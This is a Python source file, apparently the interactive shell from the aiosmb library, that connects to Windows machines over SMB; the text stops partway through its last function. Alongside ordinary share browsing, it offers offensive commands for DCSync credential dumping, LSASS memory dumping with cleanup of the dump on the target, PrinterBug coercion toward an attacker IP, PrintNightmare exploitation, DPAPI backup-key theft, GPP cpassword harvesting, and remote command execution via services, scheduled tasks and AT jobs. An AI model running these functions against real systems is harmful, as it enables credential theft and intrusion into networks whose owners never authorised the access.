import sys
import os
import asyncio
import traceback
import ntpath
import fnmatch
import datetime
import time
import shlex
import tqdm
import inspect
import typing
from typing import List, Dict
from aiosmb.external.aiocmd.aiocmd import aiocmd
from aiosmb.examples.smbpathcompleter import SMBPathCompleter

from aiosmb import logger
from aiosmb._version import __banner__
from aiosmb.commons.connection.factory import SMBConnectionFactory
from aiosmb.connection import SMBConnection
from aiosmb.commons.interfaces.machine import SMBMachine
from aiosmb.commons.interfaces.share import SMBShare
from aiosmb.commons.interfaces.file import SMBFile
from aiosmb.commons.interfaces.directory import SMBDirectory
from aiosmb.commons.exceptions import SMBException
from aiosmb.dcerpc.v5.rpcrt import DCERPCException
from aiosmb.commons.utils.fmtsize import sizeof_fmt, size_to_bytes
from asysocks import logger as sockslogger
from aiosmb.commons.utils.faccess import faccess_basic_check, faccess_mask_to_unix, faccess_mask_to_tsv, faccess_match


from aiosmb.wintypes.access_mask import *
from aiosmb.protocol.smb2.commands import *


class SMBClient(aiocmd.PromptToolkitCmd):
	def __init__(self, url = None, silent = False, no_dce = False, nosig = False):
		aiocmd.PromptToolkitCmd.__init__(self, ignore_sigint=False) #Setting this to false, since True doesnt work on windows...
		self.conn_url:str = None
		if url is not None:
			self.conn_url = SMBConnectionFactory.from_url(url)
		self.connection:SMBConnection = None
		self.machine:SMBMachine = None
		self.is_anon:bool = False
		self.silent:bool = silent
		self.nosig:bool = nosig
		self.no_dce:bool = no_dce # diables ANY use of the DCE protocol (eg. share listing) This is useful for new(er) windows servers where they forbid the users to use any form of DCE

		self.shares:Dict[str, SMBShare] = {} #name -> share
		self.__current_share:SMBShare = None
		self.__current_directory:SMBDirectory = None
		self.__current_usersid = None
		self.__current_user_groups = None
	
	def handle_exception(self, e, msg = None):
		#providing a more consistent exception handling
		frame = inspect.stack()[1]
		caller = frame.function
		args, _, _, values = inspect.getargvalues(frame[0])
		caller_args = {arg: values[arg] for arg in args}
		if 'self' in caller_args:
			del caller_args['self']
		if len(caller_args) > 0:
			caller += ' '
			for k,v in caller_args.items():
				caller += '%s=%s ' % (k,v)
			caller = caller[:-1]
		if caller.startswith('do_'):
			caller = caller[3:]
		to_print = 'CMD: "%s" ERR: ' % caller
		if isinstance(e, SMBException):
			to_print += e.pprint()
		else:
			to_print += 'Error: %s' % e
		if msg is not None:
			to_print = msg+' '+to_print
		print(to_print)
		
		formatted_exception = "".join(traceback.format_exception(type(e), e, e.__traceback__))
		logger.debug("Traceback:\n%s", formatted_exception)
		return False, e
		
		#except SMBException as e:
		#	logger.debug(traceback.format_exc())
		#	print(e.pprint())
		#	return None, e
		#except SMBMachineException as e:
		#	logger.debug(traceback.format_exc())
		#	print(str(e))
		#	return None, e
		#except DCERPCException as e:
		#	logger.debug(traceback.format_exc())
		#	print(str(e))
		#	return None, e
		#except Exception as e:
		#	traceback.print_exc()
		#	return None, e
	

	async def do_coninfo(self):
		try:
			from aiosmb._version import __version__ as smbver
			from asysocks._version import __version__ as socksver
			from minikerberos._version import __version__ as kerbver
			from winacl._version import __version__ as winaclver

			print(self.conn_url)
			print(self.machine.connection.get_extra_info())
			print('AIOSMB: %s' % smbver)
			print('ASYSOCKS: %s' % socksver)
			print('MINIKERBEROS: %s' % kerbver)
			print('WINACL: %s' % winaclver)
			return True, None
		
		except Exception as e:
			traceback.print_exc()
			return None, e

	async def do_login(self, url = None):
		"""Connects to the remote machine"""
		try:
			if self.conn_url is None and url is None:
				print('No url was set, cant do logon')
			if url is not None:
				self.conn_url = SMBConnectionFactory.from_url(url)

			cred = self.conn_url.get_credential()				
			self.connection  = self.conn_url.get_connection(nosign=self.nosig)
			
			logger.debug(self.conn_url.get_credential())
			logger.debug(self.conn_url.get_target())

			_, err = await self.connection.login()
			if err is not None:
				raise err
			self.is_anon = self.connection.gssapi.is_guest()
			self.machine = SMBMachine(self.connection)
			if self.no_dce is False:
				# listing shares for better user experience
				await self.do_shares(False)
			if self.silent is False:
				print('Login success')
			return True, None
		except Exception as e:
			traceback.print_exc()
			return self.handle_exception(e, 'Login failed!')

	async def do_logout(self):
		if self.machine is not None:
			await self.machine.close()
		self.machine = None

		if self.connection is not None:
			try:
				await self.connection.terminate()
			except Exception as e:
				logger.exception('connection.close')
		self.connection = None

	async def _on_close(self):
		await self.do_logout()

	async def do_nodce(self):
		"""Disables automatic share listing on login"""
		self.no_dce = True

	async def do_shares(self, show = True):
		"""Lists available shares"""
		try:
			if self.machine is None:
				print('Not logged in! Use "login" first!')
				return False, Exception('Not logged in!')
			async for share, err in self.machine.list_shares():
				if err is not None:
					raise err
				self.shares[share.name] = share
				if show is True:
					print(share.name)
			return True, None
		
		except Exception as e:
			return self.handle_exception(e)		

	async def do_sessions(self):
		"""Lists sessions of connected users"""
		try:
			async for sess, err in self.machine.list_sessions():
				if err is not None:
					raise err
				print("%s : %s" % (sess.username, sess.ip_addr))
		except Exception as e:
			return self.handle_exception(e)	


	async def do_wsessions(self):
		"""Lists sessions of connected users"""
		try:
			async for sess, err in self.machine.wkstlist_sessions():
				if err is not None:
					raise err
				print("%s" % sess.username)
		except Exception as e:
			return self.handle_exception(e)	

	async def do_domains(self):
		"""Lists domain"""
		try:
			async for domain, err in self.machine.list_domains():
				if err is not None:
					raise err
				print(domain)
		except Exception as e:
			return self.handle_exception(e)	

	async def do_localgroups(self):
		"""Lists local groups"""
		try:
			async for name, sid, err in self.machine.list_localgroups():
				if err is not None:
					raise err
				print("%s : %s" % (name, sid))
		except Exception as e:
			return self.handle_exception(e)	
	
	async def do_domaingroups(self, domain_name):
		"""Lists groups in a domain"""
		try:
			async for name, sid, err in self.machine.list_groups(domain_name):
				if err is not None:
					raise err
				print("%s : %s" % (name, sid))
		except Exception as e:
			return self.handle_exception(e)	
	
	async def do_groupmembers(self, domain_name, group_name):
		"""Lists members of an arbitrary group"""
		try:
			async for domain, username, sid, err in self.machine.list_group_members(domain_name, group_name):
				if err is not None:
					raise err
				print("%s\\%s : %s" % (domain, username, sid))
		except Exception as e:
			return self.handle_exception(e)	

	async def do_localgroupmembers(self, group_name):
		"""Lists members of a local group"""
		try:
			async for domain, username, sid, err in self.machine.list_group_members('Builtin', group_name):
				if err is not None:
					raise err
				print("%s\\%s : %s" % (domain, username, sid))
			
		except Exception as e:
			return self.handle_exception(e)	

	async def do_addsidtolocalgroup(self, group_name, sid):
		"""Add member (by SID) to a local group"""
		try:
			result, err = await self.machine.add_sid_to_group('Builtin', group_name, sid)
			if err is not None:
				raise err
			if result:
				print('Modification OK!')
			else:
				print('Something went wrong, status != ok')
			
		except Exception as e:
			return self.handle_exception(e)
	
	async def do_whoami(self, to_print = True):
		"""Prints current user"""
		try:
			self.__current_username, domainname, self.__current_usersid, self.__current_user_groups, err = await self.machine.whoami()
			if err is not None:
				raise err
			if to_print is True:
				print('Username: %s' % self.__current_username)
				print('Domain: %s' % domainname)
				print('SID: %s' % self.__current_usersid)
				print('Groups:')
				for group in self.__current_user_groups:
					print(' %s' % group)
			return True, None
		except Exception as e:
			return self.handle_exception(e)

	async def do_use(self, share_name):
		"""selects share to be used"""
		try:
			if self.is_anon is False or self.no_dce:
				#anonymous connection might not have access to IPC$ so we are skipping the check
				if len(self.shares) == 0:
					_, err = await self.do_shares(show = False)
					if err is not None:
						raise err

				if share_name not in self.shares:
					if share_name.upper() not in self.shares:
						print('Error! Uknown share name %s' % share_name)
						return
					share_name = share_name.upper()

				self.__current_share = self.shares[share_name]
			else:
				self.__current_share = SMBShare.from_unc('\\\\%s\\%s' % (self.connection.target.get_hostname_or_ip(), share_name))
			_, err = await self.__current_share.connect(self.connection)
			if err is not None:
				raise err
			self.__current_directory = self.__current_share.subdirs[''] #this is the entry directory
			self.prompt = '[%s]$ ' % self.__current_directory.unc_path
			_, err = await self.do_refreshcurdir()
			if err is not None:
				raise err
			return True, None

		except Exception as e:
			return self.handle_exception(e)	
			
	async def do_dir(self):
		return await self.do_ls()

	async def do_ls(self):
		try:
			if self.__current_share is None:
				print('No share selected!')
				return None, Exception('No share selected!')
			if self.__current_directory is None:
				print('No directory selected!')
				return None, Exception('No directory selected!')
			
			for entry in self.__current_directory.get_console_output():
				print(entry)
			
			return True, None
		except Exception as e:
			return self.handle_exception(e)	

	async def do_refreshcurdir(self):
		try:
			async for entry, err in self.machine.list_directory(self.__current_directory):
				#no need to put here anything, the dir bject will store the refreshed data
				a = 1
			
			return True, None
		except Exception as e:
			return self.handle_exception(e)	

	async def do_cd(self, directory_name):
		try:
			if self.__current_share is None:
				print('No share selected!')
				return False, None
			if self.__current_directory is None:
				print('No directory selected!')
				return False, None
			
			if directory_name not in self.__current_directory.subdirs:
				if directory_name == '..':
					self.__current_directory = self.__current_directory.parent_dir
					self.prompt = '[%s] $' % (self.__current_directory.unc_path)
					return True, None
				else:
					print('The directory "%s" is not in parent directory "%s"' % (directory_name, self.__current_directory.fullpath))
					return False, None
			
			else:
				self.__current_directory = self.__current_directory.subdirs[directory_name]
				self.prompt = '[%s] $' % (self.__current_directory.unc_path)
				_, err = await self.do_refreshcurdir()
				if err is not None:
					raise err

				return True, None
			
		except Exception as e:
			return self.handle_exception(e)
	
	def get_current_dirs(self):
		if self.__current_directory is None:
			return []
		return list(self.__current_directory.subdirs.keys())

	def get_current_files(self):
		if self.__current_directory is None:
			return []
		return list(self.__current_directory.files.keys())
	
	async def do_enumperms(self, accessfilter:str, depth:int = 1, outfilename:str = None):
		"""Recursively enumerates all contents of a directory and checks for specific access rights
		accessfilter: can be 'r' 'w' 'x' 'a' or a combination of those. 'a' stands for all access rights
		Example: enumperms w 10 -> lists all contents the current user has write access to, up to 10 levels deep
		"""
		try:
			if self.__current_share is None:
				print('No share selected!')
				return False, None
			if self.__current_directory is None:
				print('No directory selected!')
				return False, None
			
			await self.do_whoami(False)
			
			accessfilter = accessfilter.lower()
			depth = int(depth)
			outfile = None
			if outfilename is not None and outfilename != '':
				outfile = open(outfilename, 'w', newline = '')
			async for entry, entrytype, err in self.__current_directory.list_r(self.machine.connection, depth=depth, fetch_dir_sd=True, fetch_file_sd=True):
				sd = None
				if err is not None:
					continue
				if entrytype == 'file':
					entry = typing.cast(SMBFile, entry)
					if entry.security_descriptor is None:
						continue
					sd = entry.security_descriptor
				elif entrytype == 'dir':
					entry = typing.cast(SMBDirectory, entry)
					if entry.security_descriptor is None:
						continue
					sd = entry.security_descriptor
				else:
					continue

				if sd is not None:
					access = faccess_basic_check(entry.security_descriptor, self.__current_usersid, self.__current_user_groups)
					matches = access
					if 'a' not in accessfilter:
						matches = faccess_match(access, accessfilter)
					if matches != 0:
						res = '%s\t%s' % (entry.unc_path, faccess_mask_to_tsv(matches))
						if outfile is None:
							print(res)
						else:
							outfile.write(res+'\r\n')
			return True, None


		except Exception as e:
			return self.handle_exception(e)	

	async def do_getfilesd(self, file_name):
		try:
			if file_name not in self.__current_directory.files:
				print('file not in current directory!')
				return False, None
			file_obj = self.__current_directory.files[file_name]
			sd, err = await file_obj.get_security_descriptor(self.connection)
			if err is not None:
				raise err
			print(sd.to_sddl())
			access = faccess_basic_check(sd, self.__current_usersid, self.__current_user_groups)
			print('Access: %s' % access)
			return True, None

		except Exception as e:
			return self.handle_exception(e)	

	async def do_getdirsd(self):
		try:
			if self.__current_directory is None:
				print('No directory selected!')
				return False, None
			sd, err = await self.__current_directory.get_security_descriptor(self.connection)
			if err is not None:
				raise err
			print(str(sd.to_sddl()))
			access = faccess_basic_check(sd, self.__current_usersid, self.__current_user_groups)
			print('Access: %s' % access)
			return True, None
		except Exception as e:
			return self.handle_exception(e)
	
	async def do_getsharesd(self):
		try:
			if self.__current_share is None:
				print('No share selected!')
				return False, None
			sd, err = await self.__current_share.get_security_descriptor(self.connection)
			if err is not None:
				raise err
			print(str(sd.to_sddl()))
			access = faccess_basic_check(sd, self.__current_usersid, self.__current_user_groups)
			print('Access: %s' % access)
			return True, None
		except Exception as e:
			return self.handle_exception(e)
	
	#async def do_enumsharesd(self, accessfilter:str = 'w'):
	#	"""Checks the access permissions of the current user on all shares"""
	#	try:
	#		accessfilter = accessfilter.lower()
	#		if self.__current_usersid is None:
	#			await self.do_whoami(False)
	#		
	#		for share in self.shares:
	#			sd, err = await self.shares[share].get_security_descriptor(self.connection)
	#			if err is not None:
	#				continue
	#			
	#			if sd is None:
	#				continue
	#
	#			access = faccess_basic_check(sd, self.__current_usersid, self.__current_user_groups)
	#			print(share, access)
	#			if 'a' not in accessfilter:
	#				matches = faccess_match(access, accessfilter)
	#			if matches != 0:
	#				print('%s\t Access: %s Formatted: %s' % (share, hex(access), faccess_mask_to_unix(access)))
	#
	#			
	#		return True, None
	#	except Exception as e:
	#		return self.handle_exception(e)

	def _cd_completions(self):
		return SMBPathCompleter(get_current_dirs = self.get_current_dirs)

	def _get_completions(self):
		return SMBPathCompleter(get_current_dirs = self.get_current_files)
	
	def _getdir_completions(self):
		return SMBPathCompleter(get_current_dirs = self.get_current_dirs)
	
	def _del_completions(self):
		return SMBPathCompleter(get_current_dirs = self.get_current_files)
	
	def _sid_completions(self):
		return SMBPathCompleter(get_current_dirs = self.get_current_files)
	
	def _dirsid_completions(self):
		return SMBPathCompleter(get_current_dirs = self.get_current_dirs)
	
	def _use_completions(self):
		return SMBPathCompleter(get_current_dirs = lambda: list(self.shares.keys()))

	def _cat_completions(self):
		return SMBPathCompleter(get_current_dirs = self.get_current_files)


	async def do_services(self):
		"""Lists remote services"""
		try:
			async for service, err in self.machine.list_services():
				if err is not None:
					raise err
				print(service.get_stauts_line())
			
			return True, None
			
		except Exception as e:
			return self.handle_exception(e)
	
	async def do_servicesd(self, service_name):
		"""Fetches service's security descriptor"""
		try:
			sd, err = await self.machine.get_service_sd(service_name)
			if err is not None:
				raise err
			print(sd.to_sddl())
			return True, None
		
		except Exception as e:
			return self.handle_exception(e)

	async def do_serviceen(self, service_name):
		"""Enables a remote service"""
		try:
			res, err = await self.machine.enable_service(service_name)
			if err is not None:
				raise err
			print(res)
			return True, None
		
		except Exception as e:
			return self.handle_exception(e)
	
	async def do_servicestart(self, service_name):
		"""Starts a remote service"""
		try:
			res, err = await self.machine.start_service(service_name)
			if err is not None:
				raise err
			print('Start command sent!')
			return True, None
		
		except Exception as e:
			return self.handle_exception(e)

	async def do_servicecreate(self, service_name, command, display_name = None):
		"""Creates a remote service"""
		try:
			_, err = await self.machine.create_service(service_name, command, display_name)
			if err is not None:
				raise err
			print('Service created!')
			return True, None

		except Exception as e:
			return self.handle_exception(e)
	
	async def do_servicedel(self, service_name):
		"""Deletes a remote service"""
		try:
			_, err = await self.machine.delete_service(service_name)
			if err is not None:
				raise err
			print('Service deleted!')
			return True, None

		except Exception as e:
			return self.handle_exception(e)
	
	async def do_servicegetconfig(self, service_name):
		"""Gets info of a remote service"""
		try:
			service, err = await self.machine.get_service_config(service_name)
			if err is not None:
				raise err
			print(str(service))
			return True, None

		except Exception as e:
			return self.handle_exception(e)
	
	async def do_servicecmdexec(self, command, timeout = 1):
		"""Executes a shell command as a service and returns the result"""
		try:
			buffer = b''
			if timeout is None or timeout == '':
				timeout = 1
			timeout = int(timeout)
			async for data, err in self.machine.service_cmd_exec(command):
				if err is not None:
					raise err
				if data is None:
					break
				
				try:
					print(data.decode())
				except:
					print(data)
			return True, None

		except Exception as e:
			return self.handle_exception(e)	

	async def do_servicedeploy(self, path_to_exec, remote_path):
		"""Deploys a binary file from the local system as a service on the remote system"""
		#servicedeploy /home/devel/Desktop/cmd.exe /shared/a.exe
		try:
			basename = ntpath.basename(remote_path)
			remote_path = '\\\\%s\\%s\\%s\\%s' % (self.connection.target.get_hostname_or_ip(), self.__current_share.name, self.__current_directory.fullpath , basename)
			_, err = await self.machine.deploy_service(path_to_exec, remote_path = remote_path)
			if err is not None:
				raise err
			print('Service deployed!')
			return True, None

		except Exception as e:
			return self.handle_exception(e)	

	async def do_put(self, file_name):
		"""Uploads a file to the remote share"""
		try:
			basename = ntpath.basename(file_name)
			dst = '\\%s\\%s\\%s' % (self.__current_share.name, self.__current_directory.fullpath , basename)
			_, err = await self.machine.put_file(file_name, dst)
			if err is not None:
				print('Failed to put file! Reason: %s' % err)
				return False, err
			print('File uploaded!')
			_, err = await self.do_refreshcurdir()
			if err is not None:
				raise err
			
			return True, None

		except Exception as e:
			return self.handle_exception(e)	

	async def do_del(self, file_name):
		"""Removes a file from the remote share"""
		try:
			basename = ntpath.basename(file_name)
			dst = '\\%s\\%s\\%s' % (self.__current_share.name, self.__current_directory.fullpath , basename)
			_, err = await self.machine.del_file(dst)
			if err is not None:
				raise err
			print('File deleted!')
			_, err = await self.do_refreshcurdir()
			if err is not None:
				raise err
			return True, None

		except Exception as e:
			return self.handle_exception(e)	

	async def do_regsave(self, hive_name, file_path):
		"""Saves a registry hive to a file on remote share"""
		try:
			_, err = await self.machine.save_registry_hive(hive_name, file_path)
			if err is not None:
				raise err
			print('Hive saved!')
			return True, None
		
		except Exception as e:
			return self.handle_exception(e)	

	async def do_reglistusers(self):
		"""Saves a registry hive to a file on remote share"""
		try:
			users, err = await self.machine.reg_list_users()
			if err is not None:
				raise err
			for user in users:
				print(user)
			return True, None
		
		except Exception as e:
			return self.handle_exception(e)
			
	async def do_cat(self, file_name):
		"""Prints the content of a file to the console."""
		try:
			matched = []
			if file_name not in self.__current_directory.files:
				
				for fn in fnmatch.filter(list(self.__current_directory.files.keys()), file_name):
					matched.append(fn)
				if len(matched) == 0:
					print('File with name %s is not present in the directory %s' % (file_name, self.__current_directory.name))
					return False, None
			else:
				matched.append(file_name)
			
			for file_name in matched:
				file_obj = self.__current_directory.files[file_name]
				print('---------------------- %s ----------------------' % file_obj.fullpath)
				async for data, err in self.machine.get_file_data(file_obj):
					if err is not None:
						raise err
					if data is None:
						break
					try:
						print(data.decode())
					except:
						print(data)
			return True, None

		except Exception as e:
			return self.handle_exception(e)
	
	async def do_get(self, file_name):
		"""Download a file from the remote share to the current folder"""
		try:
			matched = []
			if file_name not in self.__current_directory.files:
				
				for fn in fnmatch.filter(list(self.__current_directory.files.keys()), file_name):
					matched.append(fn)
				if len(matched) == 0:
					print('File with name %s is not present in the directory %s' % (file_name, self.__current_directory.name))
					return False, None
			else:
				matched.append(file_name)
			
			for file_name in matched:
				file_obj = self.__current_directory.files[file_name]
				with tqdm.tqdm(desc = 'Downloading %s' % file_name, total=file_obj.size, unit='B', unit_scale=True, unit_divisor=1024) as pbar:
					with open(file_name, 'wb') as outfile:
						async for data, err in self.machine.get_file_data(file_obj):
							if err is not None:
								raise err
							if data is None:
								break
							outfile.write(data)
							pbar.update(len(data))
			
			return True, None
		except Exception as e:
			return self.handle_exception(e)
	
	async def do_getdir(self, dir_name, minfsize = None, maxfsize = None, filenamefilter = None):
		"""Download a directory recirsively from the current location on the remote machine to the current local folder.
		Minfsize and maxfsize are in bytes or in 1G 1M 1k notation. Filenamefilter is a comma separated list of fnmatch patterns (eg. *.exe,*.dll)
		In case you want to specify the parameters partially, you can use the following notation:
		getdir <dir_name> '' '1M' '*.exe,*.dll' -> only maxfsize and filenamefilter will be used
		getdir <dir_name> -> all files will be downloaded
		getdir <dir_name> '1M' -> all files bigger than 1M will be downloaded
		"""
		def matches_any_pattern(filename, patterns):
			"""
			Check if the filename matches any of the provided patterns.
			
			:param filename: The name of the file.
			:param patterns: A list of patterns to match against.
			:return: True if the filename matches any pattern, otherwise False.
			"""
			for pattern in patterns:
				if fnmatch.fnmatch(filename, pattern):
					return True
			return False
		
		
		async def get_directory(out_path:str, dir_obj:SMBDirectory):
			async for obj, otype, err in dir_obj.list_r(self.connection, depth = 1, maxentries = -1):
				if err is not None:
					continue
				if otype == 'dir':
					# normalize entry.name os independent way
					dirpath = os.path.join(out_path, ntpath.normpath(obj.name))
					os.makedirs(dirpath, exist_ok=True)
					async for lfile, entry in get_directory(dirpath, obj):
						yield lfile, entry
				elif otype == 'file':
					yield os.path.join(out_path, os.path.basename(obj.name)), obj
				else:
					continue
		try:
			maxfsize = size_to_bytes(maxfsize)
			minfsize = size_to_bytes(minfsize)
			
			if filenamefilter == '':
				filenamefilter = None
			if filenamefilter is not None:
				filenamefilter = [x.strip() for x in filenamefilter.split(',')]
			
			matched = []
			if dir_name not in self.__current_directory.subdirs:
				
				for fn in fnmatch.filter(list(self.__current_directory.subdirs.keys()), dir_name):
					matched.append(fn)
				if len(matched) == 0:
					print('Directory with name %s is not present in the directory %s' % (dir_name, self.__current_directory.name))
					return False, None
			else:
				matched.append(dir_name)
			
			for dir_name in matched:
				total_files = 0
				total_size = 0
				dir_obj = self.__current_directory.subdirs[dir_name]
				basedirname = os.path.basename(dir_obj.name) + time.strftime("%Y%m%d_%H%M%S")
				os.makedirs(basedirname, exist_ok=True)
				with tqdm.tqdm(desc = 'Downloading files...', total=0, unit='B', unit_scale=True, unit_divisor=1024) as pbar:
					async for lfile, entry in get_directory(basedirname, dir_obj):
						if maxfsize is not None and entry.size > maxfsize:
							continue
						if minfsize is not None and entry.size < minfsize:
							continue
						if filenamefilter is not None and matches_any_pattern(entry.name, filenamefilter) is False:
							continue
						pbar.total = entry.size
						pbar.n = 0
						pbar.last_print_n = 0
						pbar.start_t = time.time()
						pbar.refresh()
						desc = entry.unc_path
						if len(entry.unc_path) > 30:
							desc = '...' + entry.unc_path[-30:]
						pbar.set_description('Downloading %s' % desc)

						with open(lfile, 'wb') as outfile:
							async for data, err in self.machine.get_file_data(entry):
								if err is not None:
									break
								if data is None:
									total_files += 1
									break
								outfile.write(data)
								pbar.update(len(data))
								total_size += len(data)
					pbar.refresh()
				
				print('Donwloaded %s files, total size %s' % (total_files, sizeof_fmt(total_size)))
			return True, None
		except Exception as e:
			return self.handle_exception(e)
	
	async def do_mkdir(self, directory_name):
		"""Creates a directory on the remote share"""
		try:
			_, err = await self.machine.create_subdirectory(directory_name, self.__current_directory)
			if err is not None:
				raise err
			print('Directory created!')
			_, err = await self.do_refreshcurdir()
			if err is not None:
				raise err
			return True, None

		except Exception as e:
			return self.handle_exception(e)	
		
	async def do_dcsync(self, username = None):
		"""It's a suprse tool that will help us later"""
		try:
			users = []
			if username is not None:
				users.append(username)
			async for secret, err in self.machine.dcsync(target_users=users):
				if err is not None:
					raise err
				if secret is None:
					continue
				print(str(secret))
			
			return True, None
		
		except Exception as e:
			return self.handle_exception(e)	

	async def do_users(self, domain = None):
		"""List users in domain"""
		try:
			async for username, user_sid, err in self.machine.list_domain_users(domain):
				if err is not None:
					print(str(err))
				print('%s %s' % (username, user_sid))
			
			return True, None
		
		except Exception as e:
			return self.handle_exception(e)	

	async def do_lsass(self, lfilepath = None):
		lsassfile = None
		try:
			if lfilepath is None:
				lfilepath = 'lsass_%s.dmp' % datetime.datetime.now().strftime('%Y_%m_%d_%H%M%S')
			lsassfile, err = await self.machine.task_dump_lsass()
			if err is not None:
				raise err
			pbar = tqdm.tqdm(desc = 'Downloading lsass dump', total=lsassfile.size, unit='B', unit_scale=True, unit_divisor=1024)
			with open(lfilepath, 'wb') as f:
				while True:
					data, err = await lsassfile.read(65535)
					if err is not None:
						raise err
					if data == b'':
						break
					f.write(data)
					pbar.update(len(data))
			
			return True, None
		
		except Exception as e:
			return self.handle_exception(e)
		finally:
			if lsassfile is not None:
				await lsassfile.close()
				_, err = await self.machine.del_file(lsassfile.fullpath)

	async def do_printerbug(self, attacker_ip):
		"""Printerbug"""
		try:
			res, err = await self.machine.printerbug(attacker_ip)
			if err is not None:
				print(str(err))
			print(res)
		
			return True, None
		
		except Exception as e:
			return self.handle_exception(e)	

	async def do_tasks(self):
		"""List scheduled tasks """
		try:
			async for taskname, err in self.machine.tasks_list():
				if err is not None:
					raise err
				print(taskname)
			
			return True, None
		
		except Exception as e:
			return self.handle_exception(e)	
	
	async def do_taskxml(self, task_name):
		"""Gets the XML of a scheduled task"""
		try:
			xml, err = await self.machine.get_task(task_name)
			if err is not None:
				raise err
			print(xml)
			
			return True, None
		
		except Exception as e:
			return self.handle_exception(e)
	
	async def do_tasklistfolders(self, path = '\\'):
		"""Lists scheduled task folders"""
		try:
			async for folder, err in self.machine.list_task_folders(path):
				if err is not None:
					raise err
				print(folder)
			
			return True, None
		
		except Exception as e:
			return self.handle_exception(e)

	async def do_taskregister(self, template_file, task_name = None):
		"""Registers a new scheduled task"""
		try:
			with open(template_file, 'r') as f:
				template = f.read()

			res, err = await self.machine.tasks_register(template, task_name = task_name)
			if err is not None:
				logger.info('[!] Failed to register new task!')
				raise err
		
			return True, None
		
		except Exception as e:
			return self.handle_exception(e)	

	async def do_taskdel(self, task_name):
		"""Deletes a scheduled task	"""
		try:
			_, err = await self.machine.tasks_delete(task_name)
			if err is not None:
				raise err

			return True, None
		
		except Exception as e:
			return self.handle_exception(e)	


	async def do_taskcmdexec(self, command, timeout = 1):
		""" Executes a shell command using the scheduled tasks service"""
		try:
			buffer = b''
			if timeout is None or timeout == '':
				timeout = 1
			timeout = int(timeout)
			async for data, err in self.machine.tasks_cmd_exec(command, timeout):
				if err is not None:
					raise err
				if data is None:
					break
				
				try:
					print(data.decode())
				except:
					print(data)
			return True, None
			
			#await self.machine.tasks_execute_commands([command])
		except Exception as e:
			return self.handle_exception(e)	

	async def do_interfaces(self):
		""" Lists all network interfaces of the remote machine """
		try:
			interfaces, err = await self.machine.list_interfaces()
			if err is not None:
				raise err
			for iface in interfaces:
				print('%d: %s' % (iface['index'], iface['address']))
			
			return True, None
		
		except Exception as e:
			return self.handle_exception(e)	

	async def do_enumall(self, depth = 3):
		""" Enumerates all shares for all files and folders recursively """
		try:
			depth = int(depth)
			async for obj, otype, err in self.machine.enum_all_recursively(depth = depth):
				if err is not None:
					if otype in ['dir', 'file']:
						print('[E] %s %s' % (err, obj.unc_path))
					else:
						print('[E] %s %s' % (err, obj))

				if otype == 'file':
					obj = typing.cast(SMBFile, obj)
					print('[F] %s %s %s %s' % (obj.unc_path, obj.size, obj.last_access_time, obj.last_write_time))
				elif otype == 'dir':
					obj = typing.cast(SMBDirectory, obj)
					print('[D] %s %s %s %s' % (obj.unc_path, '0', obj.last_access_time, obj.last_write_time))
				elif otype == 'share':
					obj = typing.cast(SMBShare, obj)
					print('[S] %s' % obj.name)
				else:
					print('[?] %s' % obj)
				

			return True, None
		except Exception as e:
			return self.handle_exception(e)	

	async def do_printerenumdrivers(self):
		""" Enumerates all shares for all files and folders recursively """
		try:
			drivers, err = await self.machine.enum_printer_drivers()
			if err is not None:
				raise err
			for driver in drivers:
				print(driver)
			return True, None
		except Exception as e:
			return self.handle_exception(e)	

	async def do_printnightmare(self, share, driverpath = ''):
		""" printnightmare bug using the RPRN protocol """
		try:
			if len(driverpath) == 0:
				driverpath = None
			_, err = await self.machine.printnightmare(share, driverpath)
			if err is not None:
				raise err
			return True, None
		except Exception as e:
			return self.handle_exception(e)	
	
	async def do_parprintnightmare(self, share, driverpath = ''):
		""" printnightmare bug using the PAR protocol """
		try:
			if len(driverpath) == 0:
				driverpath = None
			_, err = await self.machine.par_printnightmare(share, driverpath)
			if err is not None:
				raise err
			return True, None
		except Exception as e:
			return self.handle_exception(e)	

	async def do_backupkeys(self, outfile = None):
		"""Obtains the DPAPI domain backup keys"""
		try:
			backupkeys, err = await self.machine.get_backupkeys()
			if err is not None:
				raise err
			for guid in backupkeys:
				if outfile is None or len(outfile) == 0:
					print('GUID: %s' % guid)
				if 'legacykey' in backupkeys[guid]:
					if outfile is None or len(outfile) == 0:
						print('Legacy key: 0x%s' % backupkeys[guid]['legacykey'].hex())
					else:
						with open('%s_%s_%s.key' % (outfile, guid, 'legacykey'), 'wb') as f:
							f.write(backupkeys[guid]['legacykey'])
				if 'pvk' in backupkeys[guid]:
					if outfile is None or len(outfile) == 0:
						print('PVK: %s' % backupkeys[guid]['pvk'].to_bytes().hex())
					else:
						with open('%s_%s.pvk' % (outfile, guid), 'wb') as f:
							f.write(backupkeys[guid]['pvk'].to_bytes())
				if 'certificate' in backupkeys[guid]:
					if outfile is None or len(outfile) == 0:
						print('Certificate: \r\n%s' % backupkeys[guid]['certificate'].hex())
					else:
						with open('%s_%s.der' % (outfile, guid), 'wb') as f:
							f.write(backupkeys[guid]['certificate'])
				if outfile is None or len(outfile) == 0:
					print('')
				else:
					print('Backupkey saved to disk')
			return True, None
		except Exception as e:
			return self.handle_exception(e)	
		
	async def do_cpasswd(self):
		"""Searches for cpassword in GPP files"""
		try:
			async for filename, username, cpassword, xmltype, err in self.machine.get_cpasswd(depth = 5):
				if err is not None:
					raise err
				print('Filename: %s' % filename)
				print('Username: %s' % username)
				print('Cpassword: %s' % cpassword)
				print('Type: %s' % xmltype)
				print('')
			print('Done!')
			return True, None
		except Exception as e:
			return self.handle_exception(e)
	

	async def do_ataddjob(self, atinfo, server_name:str = None):
		try:
			jobid, err = await self.machine.at_add_job(atinfo, server_name = server_name)
			if err is not None:
				raise err
			print('Job added! Job ID: %s' % jobid)
			return True, None
		except Exception as e:
			return self.handle_exception(e)
	
	async def do_atenum(self, server_name:str = None):
		try:
			x, err = await self.machine.at_enum(server_name = server_name)
			if err is not None:
				raise err
			print(x)
			return True, None
		except Exception as e:
			return self.handle_exception(e)
	
	async def do_atdeljob(self, jobid:int, server_name:str = None):
		try:
			jobid = int(jobid)
			_, err = await self.machine.at_del_job(jobid, server_name = server_name)
			if err is not None:
				raise err
			print('Job deleted!')
			return True, None
		
		except Exception as e:
			return self.handle_exception(e)
	
	async def do_atgetjob(self, jobid:int, server_name:str = None):
		try:
			jobid = int(jobid)
			jobinfo, err = await self.machine.at_get_info(jobid, server_name = server_name)
			if err is not None:
				raise err
			print(jobinfo)
			return True, None
		except Exception as e:
			return self.handle_exception(e)
		
	async def do_sharewritetest(self):
		try:
			async for share, writable, err in self.machine.share_write_test():
				if err is not None:
					raise err
				print('%s %s' % (share.name, writable))
